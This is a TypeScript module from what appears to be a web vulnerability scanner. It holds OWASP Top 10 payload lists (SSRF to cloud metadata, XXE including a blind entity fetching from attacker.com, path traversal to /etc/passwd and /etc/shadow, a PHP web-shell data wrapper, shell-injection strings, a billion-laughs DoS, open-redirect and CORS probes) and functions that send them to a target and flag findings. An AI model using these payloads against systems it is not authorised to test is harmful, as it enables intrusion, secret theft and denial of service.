// STRIX OWASP Testing Module
// Comprehensive tests for OWASP Top 10 vulnerabilities

import type { UnifiedVulnerability, ParameterInfo } from '../types';

// Check if running in Electron
// @ts-ignore
const isElectron = typeof window !== 'undefined' && window.ipcRenderer !== undefined;

// ============================================================================
// SSRF (Server-Side Request Forgery) - A10:2021
// ============================================================================

export const SSRF_PAYLOADS = [
    // Localhost variants
    { payload: 'http://127.0.0.1', name: 'Localhost IP' },
    { payload: 'http://localhost', name: 'Localhost name' },
    { payload: 'http://127.0.0.1:22', name: 'SSH port' },
    { payload: 'http://127.0.0.1:3306', name: 'MySQL port' },
    { payload: 'http://127.0.0.1:6379', name: 'Redis port' },
    { payload: 'http://127.0.0.1:27017', name: 'MongoDB port' },
    { payload: 'http://[::1]', name: 'IPv6 localhost' },
    { payload: 'http://0.0.0.0', name: 'All interfaces' },
    { payload: 'http://0', name: 'Zero IP' },
    
    // Internal network
    { payload: 'http://192.168.0.1', name: 'Private Class C' },
    { payload: 'http://192.168.1.1', name: 'Router IP' },
    { payload: 'http://10.0.0.1', name: 'Private Class A' },
    { payload: 'http://172.16.0.1', name: 'Private Class B' },
    
    // Cloud metadata
    { payload: 'http://169.254.169.254', name: 'AWS/GCP Metadata' },
    { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS Metadata Path' },
    { payload: 'http://metadata.google.internal', name: 'GCP Metadata' },
    { payload: 'http://100.100.100.200', name: 'Alibaba Metadata' },
    
    // DNS rebinding / bypass
    { payload: 'http://localtest.me', name: 'DNS rebind (127.0.0.1)' },
    { payload: 'http://oob-test.strix-scanner.local', name: 'OOB detection' },
    
    // Protocol handlers
    { payload: 'file:///etc/passwd', name: 'File protocol' },
    { payload: 'file:///c:/windows/system32/drivers/etc/hosts', name: 'Windows hosts' },
    { payload: 'dict://127.0.0.1:6379/info', name: 'Dict protocol' },
    { payload: 'gopher://127.0.0.1:6379/_INFO', name: 'Gopher protocol' },
    
    // URL encoding bypass
    { payload: 'http://127.0.0.1%00.evil.com', name: 'Null byte bypass' },
    { payload: 'http://127.0.0.1%23.evil.com', name: 'Hash bypass' },
    { payload: 'http://evil.com@127.0.0.1', name: 'Userinfo bypass' },
    { payload: 'http://127.0.0.1#@evil.com', name: 'Fragment bypass' },
];

// ============================================================================
// XXE (XML External Entity) - A05:2021
// ============================================================================

export const XXE_PAYLOADS = [
    // Basic XXE
    {
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
        name: 'Basic XXE',
        check: '/etc/passwd'
    },
    {
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>`,
        name: 'Windows XXE',
        check: '[fonts]'
    },
    
    // Blind XXE with OOB
    {
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo></foo>`,
        name: 'Blind XXE OOB',
        blind: true
    },
    
    // Parameter entity
    {
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">%a;]><foo>&xxe;</foo>`,
        name: 'Parameter Entity XXE',
        check: 'root:'
    },
    
    // SSRF via XXE
    {
        payload: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>`,
        name: 'XXE SSRF',
        check: 'ami-id'
    },
    
    // Billion laughs DoS (be careful)
    {
        payload: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>`,
        name: 'Billion Laughs (DoS)',
        dos: true
    },
    
    // XInclude
    {
        payload: `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`,
        name: 'XInclude',
        check: 'root:'
    },
];

// ============================================================================
// LFI/RFI (Local/Remote File Inclusion) - A01:2021
// ============================================================================

export const LFI_PAYLOADS = [
    // Basic traversal
    { payload: '../../../etc/passwd', name: 'Basic traversal' },
    { payload: '....//....//....//etc/passwd', name: 'Double dot bypass' },
    { payload: '..%2F..%2F..%2Fetc%2Fpasswd', name: 'URL encoded' },
    { payload: '..%252f..%252f..%252fetc%252fpasswd', name: 'Double URL encoded' },
    { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', name: 'Full URL encoded' },
    { payload: '....\/....\/....\/etc/passwd', name: 'Backslash bypass' },
    { payload: '..../..../..../etc/passwd', name: 'Dot bypass' },
    
    // Null byte (older PHP)
    { payload: '../../../etc/passwd%00', name: 'Null byte' },
    { payload: '../../../etc/passwd%00.jpg', name: 'Null byte extension' },
    
    // Windows paths
    { payload: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', name: 'Windows backslash' },
    { payload: '....\\....\\....\\windows\\win.ini', name: 'Windows win.ini' },
    { payload: 'C:\\Windows\\System32\\drivers\\etc\\hosts', name: 'Absolute Windows' },
    
    // PHP wrappers
    { payload: 'php://filter/convert.base64-encode/resource=index.php', name: 'PHP filter base64' },
    { payload: 'php://input', name: 'PHP input' },
    { payload: 'php://filter/read=string.rot13/resource=index.php', name: 'PHP filter rot13' },
    { payload: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', name: 'Data wrapper' },
    { payload: 'expect://id', name: 'Expect wrapper' },
    
    // Java/JSP
    { payload: '../../../WEB-INF/web.xml', name: 'Java WEB-INF' },
    { payload: '../../../META-INF/MANIFEST.MF', name: 'Java META-INF' },
    
    // Common sensitive files
    { payload: '/etc/passwd', name: 'Unix passwd' },
    { payload: '/etc/shadow', name: 'Unix shadow' },
    { payload: '/etc/hosts', name: 'Hosts file' },
    { payload: '/proc/self/environ', name: 'Proc environ' },
    { payload: '/proc/self/cmdline', name: 'Proc cmdline' },
    { payload: '/var/log/apache2/access.log', name: 'Apache log' },
    { payload: '/var/log/nginx/access.log', name: 'Nginx log' },
];

// LFI detection patterns
export const LFI_INDICATORS = [
    /root:.*:0:0:/i,  // Unix passwd
    /\[fonts\]/i,     // Windows win.ini
    /\[boot loader\]/i,  // Windows boot.ini
    /mysql.*localhost/i, // Various configs
    /<\?php/i,        // PHP source
    /<\?xml/i,        // XML files
];

// ============================================================================
// Command Injection - A03:2021
// ============================================================================

export const COMMAND_INJECTION_PAYLOADS = [
    // Basic injection
    { payload: '; id', name: 'Semicolon' },
    { payload: '| id', name: 'Pipe' },
    { payload: '|| id', name: 'OR pipe' },
    { payload: '& id', name: 'Background' },
    { payload: '&& id', name: 'AND' },
    { payload: '`id`', name: 'Backticks' },
    { payload: '$(id)', name: 'Command substitution' },
    { payload: '\n id', name: 'Newline' },
    
    // With output
    { payload: '; cat /etc/passwd', name: 'Cat passwd' },
    { payload: '| type C:\\Windows\\win.ini', name: 'Windows type' },
    
    // Time-based blind
    { payload: '; sleep 5', name: 'Sleep 5' },
    { payload: '| ping -c 5 127.0.0.1', name: 'Ping delay' },
    { payload: '& ping -n 5 127.0.0.1', name: 'Windows ping' },
    { payload: '| timeout 5', name: 'Timeout' },
    
    // Encoded variants
    { payload: '%3B id', name: 'URL encoded semicolon' },
    { payload: '%7C id', name: 'URL encoded pipe' },
    { payload: '%0a id', name: 'URL encoded newline' },
    
    // PowerShell
    { payload: '; powershell -c "whoami"', name: 'PowerShell' },
    { payload: '| powershell Get-Process', name: 'PowerShell pipe' },
];

// Command output patterns
export const COMMAND_OUTPUT_PATTERNS = [
    /uid=\d+/i,      // Unix id command
    /root:/i,        // Passwd output
    /\[fonts\]/i,    // Win.ini
    /NT AUTHORITY/i, // Windows whoami
    /COMPUTERNAME=/i, // Windows env
];

// ============================================================================
// Open Redirect - A01:2021
// ============================================================================

export const OPEN_REDIRECT_PAYLOADS = [
    // Basic redirects
    { payload: 'https://evil.com', name: 'Basic HTTPS' },
    { payload: '//evil.com', name: 'Protocol-relative' },
    { payload: '/\\evil.com', name: 'Backslash bypass' },
    { payload: '////evil.com', name: 'Multiple slashes' },
    
    // Encoding bypasses
    { payload: 'https:%2F%2Fevil.com', name: 'URL encoded slashes' },
    { payload: 'https://evil.com%2F%2F', name: 'Trailing encoded' },
    { payload: 'https://evil.com%00.target.com', name: 'Null byte' },
    
    // Domain tricks
    { payload: 'https://target.com.evil.com', name: 'Subdomain' },
    { payload: 'https://target.com@evil.com', name: 'Userinfo' },
    { payload: 'https://evil.com#target.com', name: 'Fragment' },
    { payload: 'https://evil.com?target.com', name: 'Query' },
    
    // Data/JavaScript
    { payload: 'javascript:alert(1)', name: 'JavaScript protocol' },
    { payload: 'data:text/html,<script>alert(1)</script>', name: 'Data URI' },
];

// ============================================================================
// IDOR (Insecure Direct Object Reference) - A01:2021
// ============================================================================

export const IDOR_PAYLOADS = [
    // Numeric manipulation
    { original: '1', payloads: ['0', '2', '999', '-1', '1.1'] },
    { original: '100', payloads: ['99', '101', '1', '0', '-1'] },
    
    // UUID manipulation (first/last char change)
    { original: 'a1b2c3d4', payloads: ['b1b2c3d4', 'a1b2c3d5', '00000000'] },
    
    // String manipulation
    { original: 'user', payloads: ['admin', 'root', 'administrator', 'test'] },
    { original: 'john', payloads: ['admin', 'user1', 'jane'] },
];

// ============================================================================
// CORS Misconfiguration - A05:2021
// ============================================================================

export const CORS_PAYLOADS = [
    { origin: 'https://evil.com', name: 'Arbitrary origin' },
    { origin: 'null', name: 'Null origin' },
    { origin: 'https://target.com.evil.com', name: 'Subdomain' },
    { origin: 'https://targetcom.evil.com', name: 'Domain suffix' },
    { origin: 'https://evil-target.com', name: 'Similar domain' },
];

// ============================================================================
// TEST FUNCTIONS
// ============================================================================

interface FetchResponse {
    ok: boolean;
    status: number;
    body: string;
    headers: Record<string, string>;
    responseTime: number;
    error?: string;
}

async function testFetch(url: string, options: {
    method?: string;
    body?: string;
    headers?: Record<string, string>;
    timeout?: number;
} = {}): Promise<FetchResponse> {
    const startTime = Date.now();
    
    if (isElectron) {
        try {
            // @ts-ignore
            const response = await window.ipcRenderer.invoke('web-scan-fetch', {
                url,
                method: options.method || 'GET',
                headers: options.headers || {},
                body: options.body,
                timeout: options.timeout || 15000
            });
            
            return {
                ok: response.success && response.status >= 200 && response.status < 400,
                status: response.status || 0,
                body: response.body || '',
                headers: response.headers || {},
                responseTime: Date.now() - startTime,
                error: response.error
            };
        } catch (error) {
            return {
                ok: false,
                status: 0,
                body: '',
                headers: {},
                responseTime: Date.now() - startTime,
                error: error instanceof Error ? error.message : 'Request failed'
            };
        }
    } else {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), options.timeout || 15000);
            
            const response = await fetch(url, {
                method: options.method || 'GET',
                headers: options.headers,
                body: options.body,
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            
            const body = await response.text();
            const headers: Record<string, string> = {};
            response.headers.forEach((v, k) => headers[k] = v);
            
            return {
                ok: response.ok,
                status: response.status,
                body,
                headers,
                responseTime: Date.now() - startTime
            };
        } catch (error) {
            return {
                ok: false,
                status: 0,
                body: '',
                headers: {},
                responseTime: Date.now() - startTime,
                error: error instanceof Error ? error.message : 'Request failed'
            };
        }
    }
}

/**
 * Test for SSRF vulnerabilities
 */
export async function testSsrf(
    baseUrl: string,
    parameter: ParameterInfo,
    options: { timeout?: number; maxPayloads?: number } = {}
): Promise<UnifiedVulnerability[]> {
    const vulnerabilities: UnifiedVulnerability[] = [];
    let payloads = SSRF_PAYLOADS.slice(0, options.maxPayloads || 10);
    
    for (const { payload, name } of payloads) {
        const testUrl = buildTestUrl(baseUrl, parameter, payload);
        const response = await testFetch(testUrl, { timeout: options.timeout });
        
        // Check for indicators of successful SSRF
        const indicators = [
            /ami-id|instance-id/i,  // AWS metadata
            /compute\.internal/i,    // GCP metadata
            /root:.*:0:0:/i,         // Local file read
            /Connection refused/i,   // Internal service probe
        ];
        
        if (response.ok && indicators.some(p => p.test(response.body))) {
            vulnerabilities.push({
                id: `ssrf-${parameter.name}-${Date.now()}`,
                category: 'ssrf',
                severity: 'critical',
                title: 'Server-Side Request Forgery (SSRF)',
                description: `SSRF vulnerability in parameter "${parameter.name}" using ${name}`,
                url: baseUrl,
                location: `Parameter: ${parameter.name}`,
                evidence: response.body.substring(0, 500),
                recommendation: 'Validate and sanitize URLs. Use allowlists for permitted hosts.',
                cwe: 'CWE-918',
                owasp: 'A10:2021'
            });
            break; // Found vulnerability, no need to continue
        }
    }
    
    return vulnerabilities;
}

/**
 * Test for LFI vulnerabilities
 */
export async function testLfi(
    baseUrl: string,
    parameter: ParameterInfo,
    options: { timeout?: number; maxPayloads?: number } = {}
): Promise<UnifiedVulnerability[]> {
    const vulnerabilities: UnifiedVulnerability[] = [];
    let payloads = LFI_PAYLOADS.slice(0, options.maxPayloads || 15);
    
    for (const { payload, name } of payloads) {
        const testUrl = buildTestUrl(baseUrl, parameter, payload);
        const response = await testFetch(testUrl, { timeout: options.timeout });
        
        if (response.ok && LFI_INDICATORS.some(p => p.test(response.body))) {
            vulnerabilities.push({
                id: `lfi-${parameter.name}-${Date.now()}`,
                category: 'path-traversal',
                severity: 'critical',
                title: 'Local File Inclusion (LFI)',
                description: `LFI vulnerability in parameter "${parameter.name}" using ${name}`,
                url: baseUrl,
                location: `Parameter: ${parameter.name}`,
                evidence: response.body.substring(0, 500),
                recommendation: 'Validate file paths. Use allowlists. Avoid passing user input to file operations.',
                cwe: 'CWE-22',
                owasp: 'A01:2021'
            });
            break;
        }
    }
    
    return vulnerabilities;
}

/**
 * Test for Command Injection vulnerabilities
 */
export async function testCommandInjection(
    baseUrl: string,
    parameter: ParameterInfo,
    options: { timeout?: number; maxPayloads?: number; testTimeBased?: boolean } = {}
): Promise<UnifiedVulnerability[]> {
    const vulnerabilities: UnifiedVulnerability[] = [];
    let payloads = COMMAND_INJECTION_PAYLOADS.slice(0, options.maxPayloads || 10);
    
    for (const { payload, name } of payloads) {
        const testUrl = buildTestUrl(baseUrl, parameter, payload);
        const response = await testFetch(testUrl, { timeout: options.timeout });
        
        // Check for command output
        if (response.ok && COMMAND_OUTPUT_PATTERNS.some(p => p.test(response.body))) {
            vulnerabilities.push({
                id: `cmdi-${parameter.name}-${Date.now()}`,
                category: 'injection',
                severity: 'critical',
                title: 'Command Injection',
                description: `Command injection in parameter "${parameter.name}" using ${name}`,
                url: baseUrl,
                location: `Parameter: ${parameter.name}`,
                evidence: response.body.substring(0, 500),
                recommendation: 'Never pass user input to shell commands. Use parameterized APIs.',
                cwe: 'CWE-78',
                owasp: 'A03:2021'
            });
            break;
        }
        
        // Time-based detection
        if (options.testTimeBased && name.includes('Sleep') && response.responseTime > 4500) {
            vulnerabilities.push({
                id: `cmdi-time-${parameter.name}-${Date.now()}`,
                category: 'injection',
                severity: 'high',
                title: 'Potential Command Injection (Time-based)',
                description: `Possible command injection (time-based) in "${parameter.name}"`,
                url: baseUrl,
                location: `Parameter: ${parameter.name}`,
                evidence: `Response time: ${response.responseTime}ms`,
                recommendation: 'Investigate time delay. Avoid shell commands with user input.',
                cwe: 'CWE-78',
                owasp: 'A03:2021'
            });
            break;
        }
    }
    
    return vulnerabilities;
}

/**
 * Test for Open Redirect vulnerabilities
 */
export async function testOpenRedirect(
    baseUrl: string,
    parameter: ParameterInfo,
    options: { timeout?: number } = {}
): Promise<UnifiedVulnerability[]> {
    const vulnerabilities: UnifiedVulnerability[] = [];
    
    for (const { payload, name } of OPEN_REDIRECT_PAYLOADS.slice(0, 8)) {
        const testUrl = buildTestUrl(baseUrl, parameter, payload);
        const response = await testFetch(testUrl, { timeout: options.timeout });
        
        // Check for redirect to evil domain
        const location = response.headers['location'] || '';
        if ((response.status === 301 || response.status === 302 || response.status === 307) &&
            (location.includes('evil.com') || location.startsWith('javascript:') || location.startsWith('data:'))) {
            vulnerabilities.push({
                id: `redirect-${parameter.name}-${Date.now()}`,
                category: 'open-redirect',
                severity: 'medium',
                title: 'Open Redirect',
                description: `Open redirect in parameter "${parameter.name}" using ${name}`,
                url: baseUrl,
                location: `Parameter: ${parameter.name}`,
                evidence: `Redirects to: ${location}`,
                recommendation: 'Validate redirect URLs. Use allowlists for permitted destinations.',
                cwe: 'CWE-601',
                owasp: 'A01:2021'
            });
            break;
        }
    }
    
    return vulnerabilities;
}

/**
 * Test for CORS misconfiguration
 */
export async function testCors(
    url: string,
    options: { timeout?: number } = {}
): Promise<UnifiedVulnerability[]> {
    const vulnerabilities: UnifiedVulnerability[] = [];
    
    for (const { origin, name } of CORS_PAYLOADS) {
        const response = await testFetch(url, {
            timeout: options.timeout,
            headers: { 'Origin': origin }
        });
        
        const acao = response.headers['access-control-allow-origin'] || '';
        const acac = response.headers['access-control-allow-credentials'] || '';
        
        // Vulnerable if origin is reflected or wildcard with credentials
        if (acao === origin || (acao === '*' && acac === 'true')) {
            vulnerabilities.push({
                id: `cors-${Date.now()}`,
                category: 'misconfiguration',
                severity: acao === origin && acac === 'true' ? 'high' : 'medium',
                title: 'CORS Misconfiguration',
                description: `CORS allows ${name}: ${acao}`,
                url,
                location: 'CORS Headers',
                evidence: `ACAO: ${acao}, ACAC: ${acac}`,
                recommendation: 'Configure strict CORS policies. Avoid reflecting arbitrary origins.',
                cwe: 'CWE-942',
                owasp: 'A05:2021'
            });
            break;
        }
    }
    
    return vulnerabilities;
}

/**
 * Helper: Build test URL with payload
 */
function buildTestUrl(baseUrl: string, param: ParameterInfo, payload: string): string {
    try {
        const url = new URL(baseUrl);
        if (param.type === 'query') {
            url.searchParams.set(param.name, payload);
        }
        return url.toString();
    } catch {
        return baseUrl;
    }
}

/**
 * Run all OWASP tests on parameters
 */
export async function runOwaspTests(
    baseUrl: string,
    parameters: ParameterInfo[],
    options: {
        testSsrf?: boolean;
        testLfi?: boolean;
        testCommandInjection?: boolean;
        testOpenRedirect?: boolean;
        testCors?: boolean;
        timeout?: number;
        onProgress?: (current: number, total: number, test: string) => void;
    } = {}
): Promise<UnifiedVulnerability[]> {
    const allVulns: UnifiedVulnerability[] = [];
    let current = 0;
    
    // Count total tests
    let total = 0;
    if (options.testSsrf !== false) total += parameters.length;
    if (options.testLfi !== false) total += parameters.length;
    if (options.testCommandInjection !== false) total += parameters.length;
    if (options.testOpenRedirect !== false) total += parameters.length;
    if (options.testCors !== false) total += 1;
    
    // CORS test (once per URL)
    if (options.testCors !== false) {
        if (options.onProgress) options.onProgress(++current, total, 'CORS');
        const corsVulns = await testCors(baseUrl, { timeout: options.timeout });
        allVulns.push(...corsVulns);
    }
    
    // Parameter-based tests
    for (const param of parameters) {
        if (options.testSsrf !== false) {
            if (options.onProgress) options.onProgress(++current, total, `SSRF: ${param.name}`);
            const ssrfVulns = await testSsrf(baseUrl, param, { timeout: options.timeout });
            allVulns.push(...ssrfVulns);
        }
        
        if (options.testLfi !== false) {
            if (options.onProgress) options.onProgress(++current, total, `LFI: ${param.name}`);
            const lfiVulns = await testLfi(baseUrl, param, { timeout: options.timeout });
            allVulns.push(...lfiVulns);
        }
        
        if (options.testCommandInjection !== false) {
            if (options.onProgress) options.onProgress(++current, total, `CMDi: ${param.name}`);
            const cmdiVulns = await testCommandInjection(baseUrl, param, { timeout: options.timeout });
            allVulns.push(...cmdiVulns);
        }
        
        if (options.testOpenRedirect !== false) {
            if (options.onProgress) options.onProgress(++current, total, `Redirect: ${param.name}`);
            const redirectVulns = await testOpenRedirect(baseUrl, param, { timeout: options.timeout });
            allVulns.push(...redirectVulns);
        }
    }
    
    return allVulns;
}

export default {
    testSsrf,
    testLfi,
    testCommandInjection,
    testOpenRedirect,
    testCors,
    runOwaspTests,
    SSRF_PAYLOADS,
    XXE_PAYLOADS,
    LFI_PAYLOADS,
    COMMAND_INJECTION_PAYLOADS,
    OPEN_REDIRECT_PAYLOADS,
    CORS_PAYLOADS
};
